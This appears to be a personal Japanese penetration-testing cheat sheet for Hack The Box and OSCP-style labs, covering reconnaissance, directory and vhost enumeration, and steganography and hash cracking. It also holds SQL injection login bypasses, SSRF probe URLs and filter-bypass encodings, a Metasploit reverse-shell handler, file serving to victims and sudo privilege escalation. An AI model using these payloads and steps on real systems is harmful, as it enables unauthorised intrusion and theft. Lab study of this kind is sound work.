## 偵察

### 通信相手のOSを知る
```bash
ping -c 1 <IP>
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器

---

### nmapポートスキャン

```bash
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn <IP>
```
- `-vvv`
    - 詳細な出力を有効化する（デバッグ情報を増やす）。
    - `-v` で基本的な詳細情報を表示、`-vv` でより詳細、`-vvv` で最も詳細な出力となる。
- `-sCV`
    - `-sC`: Nmapのデフォルトスクリプトを実行する。
        - これにより、サービス検出や脆弱性スキャンが行われることがある。
    - `-sV`: サービスバージョンを検出する。
        - 各ポートで動作しているサービスのバージョン情報を取得しようとする。
        - 例えば、`Apache 2.4.41` などの詳細な情報が得られることがある。

---

### Webサーバ上のディレクトリ列挙

- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適
### Feroxbuster 
えぐいディレクトリスキャナー
一つの隠しフォルダ見つけたら、その中で再起的にディレクトリスキャンしてくれる
```bash
feroxbuster -u <http://TARGET>
```

### Dirsearch
HTBにはdirsearch入ってないので、dirsearchを入れるところから
```bash
sudo apt install dirsearch -y
```

両方大事
```bash
dirsearch -u <domain> -t 50 -i 200
```

```bash
sudo dirsearch --url=http://popcorn.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
```

---

### ffuf
サブディレクトリの検索に使える
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<domain> -H "Host: FUZZ.<domain>" -mc 200
```
 - 注意点としては、サブドメインにも、hostsで設定しないとサーバーエラーになる```

---

### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/vhosts.txt
```

---

### サイト脆弱性スキャン

```bash
nikto -h http://<IP>
```

### FTP匿名ログイン

```bash
ftp <IP>
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

---

## Webサイトからの情報取得
### ログインフォームがあったら
- webappの名前とバージョンが分かれば、デフォルトのユーザーネーム、パスワードを検索して、試す
- SQLインジェクション
	- ' OR 1=1;--
		- select * from users where username='' and password='' OR 1=1;
	- admin' OR 1=1;--
		- select * from users where username='admin' and password='' OR 1=1;
	- 詳しいことは
		- https://scrapbox.io/tadanomemo777/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3

### htmlソースでの検索
- コメントの検索
	- 内部IPアドレスやAPIキー、パスワードが見つかることもある
	- 検索ボックスに「```<!--```」を入れて検索
- キーの検索
	- 検索ボックスに以下を入れて検索
	- `key`
	- `keys`
	- `api`
	- `password`
	- `credential`
- CMSについての検索
	- CMSが使われていればCMSの脆弱性をつくこともできる
	- 検索ボックスに
		- wordpress
		- drupal
		- joomla
	- を入れて検索
### Burp Suite
- TargetタブのStitemapからも概要がわかる

### `curl`での確認

`md`ファイルなどはブラウザよりも`curl`での確認が見やすい。

```bash
curl -k <URL>
```

- `-k`：エラーを無視するオプション

### Webサイトのヘッダー情報の取得
CMS、JavaScriptライブラリ、ウェブサーバ、バージョン番号、ウェブフレームワークの取得

```bash
sudo whatweb http://<IP>
```

### .Gitが見つかったら

- .gitがあったら、.git/logs/HEADを参照したら、remoteのurl出てきたりすることがある
- GitHackを使って、gitファイルをダンプする
	- [https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://www.openssl.org/.git/
```

## URLを入力して、サーバーがリクエストを送るフォームがある場合
SSRF : Server-Side Request Forgeryの脆弱性がある可能性がある
攻撃者がサーバーに不正なリクエストを送信させ、内部ネットワークや非公開のAPIにアクセスさせる脆弱性
**SSRFの脆弱性があるケースの詳細**
- ユーザーが指定したURLに対して、サーバーがリクエストを送る機能がある
	- 画像のURLプレビュー
		- ユーザーがURLを入力すると、画像を取得して表示
	- webhookの登録
		- ユーザーがwebhookのURLを指定すると、。サーバーがリクエストを送る
	- 外部APIと連携するシステム
- 外部サービスとの通信を行う機能がある
	- PDFの生成機能
	- クラウド関連の操作
		- AWSやGCPのメタデータにアクセスできるの可能性がある

**検証方法**
1. 内部サービスへのアクセスを確認するためにローカルアドレスにリクエスト送る
	burpsuiteでサーバーがリクエストを送っているかを確認する
	基本的なSSRFテスト
	入力フォームやAPIエンドポイントに、以下のURLを試す
```
http://127.0.0.1/
http://localhost/
http://192.168.1.1/
http://10.0.0.1/
http://[::1]/
```
→ 何らかのレスポンスがある場合、内部アクセスが可能な可能性が高い。

管理パネルのチェック
SSRFで管理パネルやアプリケーションにアクセスできるかを調査
```
http://localhost/admin
http://127.0.0.1:8000/
http://127.0.0.1:8080/
http://127.0.0.1:5000/
http://127.0.0.1:9001/ (Supervisor)
```
→ 404以外のレスポンスや特定の管理画面のレスポンスが返ってきたら脆弱性あり。

**Bypass Techniques（フィルタ回避）**
一部のサーバーでは、SSRFを防ぐために「`localhost` へのリクエスト禁止」などの制限がある。
以下の方法でバイパスを試す。
- IPアドレスのエンコード
```
http://2130706433/  # 127.0.0.1 を整数表記
http://0x7F000001/  # 127.0.0.1 を16進数
```
- DNS Rebinding
一部のサーバーでは、外部ドメインから内部へリクエストを送れるようになる。
```
http://attacker-controlled-domain.com/
```
→ DNSリバインディングを利用し、`localhost` へリダイレクト。




---
## 脆弱性の探索

### XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。
- わけではないこともあることがわかった。SeaはXSSからのRCEで侵入できる。

### Searchsploit
#### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
	 より最新で、上手くいく可能性が高いから

- searchsploitでExploitDBのリンクも表示するオプション
- でも、これつけるとローカルでの場所が表示されなくなっちゃう😢
  ```bash
  searchsploit -w <検索キーワード>
  ```
#### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー
#### 使い方だけ出力したい
	 | grep -i usage <PoC file>

- Authenticated~系は、攻撃者がログインした後にできる攻撃なので、ログインしてないと無理
### Searchsploitだけで全てだと思わない。Google検索もする
検索キーワード　: `SoftwareName Version CVE`




---

## Exploit
---
### 侵入のための足がかり
#### ステガノグラフィーツール
CTFでは、意味ありげな画像がポンと渡されて、何も情報がない場合、ステガノグラフィーのこともある。

ファイルの埋め込み
```bash
steghide embed -cf cvr.jpg -ef emb.txt
```
データの抽出:
```bash
steghide extract -sf stg.jpg
```
##### パスフレーズがかかってて、突破できない時
1. 何が入ってるのかを確認する
```bash
sudo apt install stegcracker -y
sudo apt install steghide -y
sudo steghide info *.jpg
```
2. 何も入力しないでEnterを押すことで突破できないか試す
```bash
sudo steghide extract -sf *.jpg
```
3. ヒントの確認
	- 隠されたパスフレーズがファイルのメタデータや埋め込まれたコメントに含まれている場合がある。以下のコマンドでチェック
```bash
strings HackerAccessGranted.jpg
exiftool HackerAccessGranted.jpg
```
4. 辞書攻撃
	- よく使用される辞書ファイル
	- `rockyou.txt`（多くのステガノグラフィー攻撃で利用される）
```bash
stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt
```
 
#### 文字の画像などでモザイクがかかってて複合したい時
 - [https://github.com/spipm/Depix.git]を使う
 ```sh
git clone https://github.com/spipm/Depix.git
cd Depix
 ```

```
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```
#### 攻撃者側のサーバー内のファイルをやられ側に移す

 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする

#### SMTPサーバーを建てる
- Kali LinuxでSMTPサーバーを構築するには、Postfixなどのメールサーバーソフトウェアで立てる
まずインストールする
```bash
sudo apt update
sudo apt install postfix
```
簡単な設定する
```bash
sudo nano /etc/postfix/main.cf
```

```bash
myhostname = mail.example.com  # サーバーのホスト名
mydomain = example.com         # ドメイン名
myorigin = $mydomain
inet_interfaces = all          # 外部からの接続を許可
inet_protocols = ipv4          # IPv4のみを使用
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
mynetworks = 127.0.0.0/8       # 接続を許可するネットワーク（適宜変更）
relayhost =                    # リレー先（空の場合は直接送信）
```

設定を適用するためにPostfixの再起動する
```bash
sudo systemctl restart postfix
sudo systemctl enable postfix
```

####  johnを使いたい時
**単純なハッシュ**
1. hashes.txtに直す
```bash
echo "ハッシュ" > hashes.txt
```
2. ハッシュの形式を指定して、johnを使って解析
```bash
john --format=raw-sha512 hashes.txt
```

ハッシュの形式が不明な場合
```bash
hashid -m 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
```

**複雑な形式**
1. まず自分の目的に合ったjohnのスクリプトを探して、johnが解析できる.johnの形に変換する
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```
2. johnでワードリストを指定して解析
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt 探したい.john
```


---
### リバースシェルの作成
- https://www.revshells.com/

### Metasploit 

#### リバースシェルリスナーの設置

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```

#### **セッション管理**

#### **セッション一覧表示**

```bash
sessions -l
```

#### **セッション接続・セッションに戻る**

```bash
sessions -i <セッション番号>
```

####  **セッション全終了**
se
```bash
sessions -K
```


---

#### **特権昇格の発見とエクスプロイト**

##### **local_exploit_suggester を使う**

Mesterpreterでユーザー権限でセッションが確立している時、**`local_exploit_suggester`** モジュールを使用して、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができます。

```bash
use post/multi/recon/local_exploit_suggester
```

---
## Exploit後
### シェルアップデート
- linux
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

## Lateral Movement
- データベース情報を書き換える・新規追加
	- データベースの種類を見分ける方法
		- **ポート番号3306**は、MySQLまたはMariaDBのデフォルトポート
		- **ポート番号:5432**:PostgreSQL
- webのログインで取得したパスワードとサーバー上のユーザーが同じ

## 権限昇格
- 現在のユーザーで、sudo コマンドを使用して実行可能なコマンドや権限を確認する
```bash
sudo -l
```
- 正直HTBのEasyとかMediumの一部では、このコマンド打って、NoPasswordって書いてあるスクリプトをsudo権限で実行すれば権限昇格できる。
- 要は、sudoで新しくターミナルなり、サーバー立ち上げて、勝手にログインすればいいよねくらいな感じ
	- ./bin/fuckin sudo /bin/bash

## フラグの検索

- ファイル名が`user.txt`の場合

```bas
find / -type f -iname "user.txt" 2>/dev/null
```

- ファイル名が`root.txt`の場合

```bash
find / -type f -iname "root.txt" 2>/dev/null
```

`grep`を使用して特定の文字列を含むファイルを検索

もし、ディレクトリ内のファイルの中身を再帰的に検索する場合

- `user`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "user" / 2>/dev/null
```

- `root`という文字列を検索（大文字・小文字を無視）

```bash
grep -ri "root" / 2>/dev/null
```





